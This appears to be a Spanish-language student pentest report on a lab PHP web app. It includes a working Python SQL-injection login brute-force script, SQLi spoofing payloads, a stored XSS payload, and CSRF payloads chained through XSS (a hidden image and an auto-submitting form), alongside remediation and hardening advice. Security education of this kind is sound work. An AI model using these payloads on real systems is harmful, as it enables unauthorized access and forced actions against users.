# **Informe de Pentesting: Talent ScoutTech**

**Proyecto 03 \- Análisis de Vulnerabilidades Web**

## **1\. Inyección SQL (SQLi)**

## **1.1 Enumeración y Detección**

El objetivo inicial fue identificar vectores de inyección en la autenticación. Se realizaron pruebas manuales sobre el endpoint `insert_player.php`, específicamente en el formulario de registro.

Al inyectar una comilla simple (`'`) en el campo `username` (dejando el password vacío), la aplicación retornó un error de sintaxis y un fallo de tipo lógico (esperaba un objeto/array pero recibió un booleano). Este comportamiento confirma la ausencia de sentencias preparadas y sugiere que la consulta backend es:  
`SELECT * FROM users WHERE username = '$user_input'`

**Matriz de Inyección:**

| Parámetro | Valor | Endpoint | Resultado |
| :---- | :---- | :---- | :---- |
| **Input** | `username` | `insert_player.php` | Sintaxis SQL rota |
| **Payload** | `'` | Formulario Login | Error / `Bool(false)` |
| **Campos** | `user`, `password` | \- | Exposición de estructura |

## **1.2 Explotación (Authentication Bypass)**

Dado que desconocemos los usuarios válidos en la base de datos, se diseñó un ataque para saltar la autenticación iterando contraseñas comunes contra una inyección que fuerza un resultado verdadero (`OR 1=1`).

**Script de Explotación (Python):**  
El script desarrollado realiza peticiones `POST` iterando un diccionario. El payload inyectado en `username` busca omitir la validación del nombre, delegando el éxito únicamente a la coincidencia de la contraseña en algún registro (usando `LIMIT/OFFSET`).

python  
`import urllib.parse`  
`import http.client`

`HOST = "localhost"`  
`PATH = "/web/insert_player.php"`  
`ERROR_TEXT = "invalid user or password"`

*`# Diccionario reducido para PoC`*  
`passwords = ["password", "123456", "12345678", "1234", "qwerty", "dragon"]`

`conn = http.client.HTTPConnection(HOST)`

`for pwd in passwords:`  
    `# Payload para bypass de usuario + iteración de password`  
    `injected_username = '" OR 1=1 LIMIT 1 OFFSET 1 -- -'`

    `body = urllib.parse.urlencode({`  
        `"username": injected_username,`  
        `"password": pwd`  
    `})`

    `headers = {`  
        `"Content-Type": "application/x-www-form-urlencoded",`  
        `"Content-Length": str(len(body)),`  
        `"Host": HOST,`  
    `}`

    `conn.request("POST", PATH, body=body, headers=headers)`  
    `resp = conn.getresponse()`  
    `resp_body = resp.read().decode(errors="ignore")`

    `print(f"[+] Trying '{pwd}' -> status {resp.status}, len={len(resp_body)}")`

    `if ERROR_TEXT.lower() not in resp_body.lower():`  
        `print(f"[!] SUCCESS: Password found = '{pwd}'")`  
        `break`

`conn.close()`

**Resultado:**  
La ejecución del script confirmó el acceso exitoso.

* **Vector de Acceso:** `username = " OR 1=1 LIMIT 1 OFFSET 1 -- -`  
* **Credencial Comprometida:** `1234`

## **1.3 Análisis de Remediación (`SQLite3::escapeString`)**

La implementación actual de `escapeString()` es ineficaz para este contexto. La función está diseñada para escapar comillas simples (`'`), sin embargo, la consulta SQL del código fuente encapsula la variable con comillas dobles (`"`).  
Esto permite romper la cadena con una comilla doble sin que la función de sanitización intervenga.

**Recomendación:** Implementar **Sentencias Preparadas (Prepared Statements)** para separar la lógica SQL de los datos del usuario.

## **1.4 Inyección SQL en Comentarios (IDOR)**

Se detectó una vulnerabilidad crítica en `add_comment.php`. El parámetro `id` recibido por GET se concatena directamente en la sentencia `INSERT` sin validación previa.

**Endpoint Vulnerable:**  
`http://localhost/web/show_comments.php?id=3`

**Prueba de Concepto (PoC):**  
Mediante la manipulación de la URL, es posible suplantar la identidad del autor del comentario (Spoofing).

* **Payload:** `3', '1', 'Comentario spoofeado') -- -`  
* **Impacto:** El comentario se registra en la base de datos asociado al `userId = 1` (potencialmente un administrador) en lugar del usuario autenticado.

## **2\. Cross-Site Scripting (XSS)**

## **2.1 XSS Almacenado (Stored XSS)**

La aplicación no sanitiza los datos de entrada en la sección de comentarios, permitiendo la inyección de código JavaScript persistente.

**Vector de Ataque:**

* **Ubicación:** Formulario de comentarios (`add_comment.php`).  
* **Payload:** `<script>alert('test xss');</script>`

**Evidencia:**  
Al acceder nuevamente a la sección de comentarios del perfil afectado, el código inyectado se ejecuta automáticamente en el navegador, desplegando el alert. Esto confirma la falta de filtrado de caracteres especiales (`<`, `>`, `/`).

## **2.2 Codificación de Entidades HTML**

Se observó el uso de `&amp;` en lugar de `&` en los parámetros GET del código fuente. Esto obedece a estándares de validación HTML W3C para evitar conflictos de interpretación con entidades, pero no representa una vulnerabilidad ni un mecanismo de seguridad activo.

## **2.3 Remediación**

El origen del fallo en `show_comments.php` es la impresión directa de datos (`echo $row['body']`).  
**Solución Técnica:**  
Es mandatorio el uso de funciones de codificación de salida.

php  
*`// Implementación segura`*  
`echo "Comment: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');`

## **2.4 Hallazgo Adicional: `list_players.php`**

Una revisión de código (Source Code Review) reveló que el archivo `list_players.php` también es vulnerable. Los campos `name` y `team` se renderizan sin sanitización. Un atacante podría registrar un usuario con un nombre malicioso, logrando un ataque de XSS masivo contra cualquier visitante de la lista de jugadores.

## **3\. Control de Acceso y Sesiones**

## **3.1 Hardening del Registro (`register.php`)**

El módulo de registro actual presenta deficiencias de seguridad graves (permitir campos vacíos, almacenamiento en texto plano).  
**Acciones Correctivas:**

* **Validación:** Implementar filtros estrictos (alfanuméricos para usuario, formato válido para email).  
* **Cifrado:** Sustituir almacenamiento en texto plano por `password_hash()` (Bcrypt/Argon2).  
* **Base de Datos:** Migración obligatoria a Consultas Preparadas.

## **3.2 Gestión de Sesiones (`auth.php`)**

**Vulnerabilidad Crítica (CWE-312):** Las credenciales (`user`, `password`) se almacenan en Cookies del cliente.  
**Solución:**

* Transición a `$_SESSION` para almacenamiento en servidor.  
* En la cookie del cliente solo debe residir el identificador `PHPSESSID`.  
* Implementar `session_regenerate_id(true)` post-login para mitigar fijación de sesiones.

## **3.3 Control de Acceso (ACL)**

El script `register.php` es accesible públicamente. Se debe restringir el acceso mediante validación de sesión al inicio del script, asegurando que solo usuarios autorizados puedan generar nuevos registros.

## **3.4 Protección de Directorios**

El directorio `/private` es accesible y listable por defecto. Se recomienda desplegar un archivo `.htaccess` con la directiva `Deny from all` para bloquear el acceso HTTP directo.

## **3.5 Secuestro de Sesión**

La aplicación valida la identidad confiando ciegamente en la cookie `userId`. Su modificación trivial permite la suplantación de identidad (Account Takeover).  
**Mitigación:**

* Gestión de sesión server-side.  
* Configuración de cookies con flags `HttpOnly` (anti-XSS) y `Secure` (tráfico cifrado).  
* Timeouts de sesión por inactividad.

## **4\. Hardening del Servidor Web**

Se aplicaron las siguientes configuraciones para reducir la superficie de ataque y la huella digital del servidor (Apache/PHP):

1. **Banner Grabbing:** `ServerTokens Prod` y `ServerSignature Off`. Oculta versiones específicas del software para dificultar la búsqueda de exploits (CVEs).  
2. **Directory Listing:** `Options -Indexes`. Evita la enumeración de archivos en directorios sin índice.  
3. **Cabeceras de Seguridad:**  
   * `X-Frame-Options: SAMEORIGIN` (Mitigación de Clickjacking).  
   * `X-Content-Type-Options: nosniff`.  
4. **Configuración PHP (`php.ini`):**  
   * `expose_php = Off`: Oculta la cabecera X-Powered-By.  
   * `display_errors = Off`: Previene la fuga de información técnica en producción.  
   * `disable_functions`: Deshabilita ejecución de comandos del sistema (`exec`, `shell_exec`, `system`).  
5. **Archivos Sensibles:** Bloqueo vía `.htaccess` para extensiones críticas (`.bak`, `.sql`, `.ini`, `~`).

## **5\. Cross-Site Request Forgery (CSRF)**

## **5.1 Vector: Enlace Malicioso**

Se modificó `list_players.php` insertando un botón trampa ("Profile") enlazado a `donate.php`. La acción provoca una transferencia GET inadvertida si la víctima tiene sesión activa.

## **5.2 Escalada: CSRF Invisible (XSS Chaining)**

Para eliminar la interacción del usuario, se encadenó el ataque con la vulnerabilidad XSS detectada previamente.  
**Payload:**  
`<img src="http://web.pagos/donate.php?..." style="display:none">`  
Al renderizarse el comentario, el navegador ejecuta la petición automáticamente sin intervención de la víctima.

## **5.3 Persistencia ante cambios a POST**

Si el endpoint cambiara a método POST, el ataque vía `<img>` sería ineficaz, pero la vulnerabilidad persistiría.  
**Payload Adaptado (POST):**  
Inyección de un formulario oculto con auto-envío mediante JavaScript:

xml  
`<form id="csrf" action="..." method="POST">...</form>`  
`<script>document.getElementById('csrf').submit();</script>`

**Conclusión:** El cambio de verbo HTTP no es una medida de seguridad válida. La única remediación efectiva es la implementación de **Anti-CSRF Tokens** sincronizados.

